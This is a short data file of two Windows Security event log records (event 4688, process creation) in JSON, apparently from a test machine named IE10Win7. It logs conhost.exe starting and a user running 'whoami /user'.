{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:20:19.153320Z"},"EventRecordID":13503,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-18","SubjectUserName":"IE10WIN7$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","NewProcessId":"0x974","NewProcessName":"C:\\Windows\\System32\\conhost.exe","TokenElevationType":"%%1937","ProcessId":"0x16c","CommandLine":"\\??\\C:\\Windows\\system32\\conhost.exe \"-1343704171045026918-905930099613171137-1254420426-992834184846412690-2015401740\""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-Security-Auditing","Guid":"54849625-5478-4994-A5BA-3E3B0328C30D"},"EventID":4688,"Version":1,"Level":0,"Task":13312,"Opcode":0,"Keywords":"0x8020000000000000","TimeCreated_attributes":{"SystemTime":"2016-09-20T19:20:20.465820Z"},"EventRecordID":13504,"Correlation":null,"Execution_attributes":{"ProcessID":4,"ThreadID":56},"Channel":"Security","Computer":"IE10Win7","Security":null},"EventData":{"SubjectUserSid":"S-1-5-21-3463664321-2923530833-3546627382-1000","SubjectUserName":"IEUser","SubjectDomainName":"IE10WIN7","SubjectLogonId":"0x6793c","NewProcessId":"0xc58","NewProcessName":"C:\\Windows\\System32\\whoami.exe","TokenElevationType":"%%1937","ProcessId":"0xc50","CommandLine":"\"C:\\Windows\\system32\\whoami.exe\"  /user"}}}
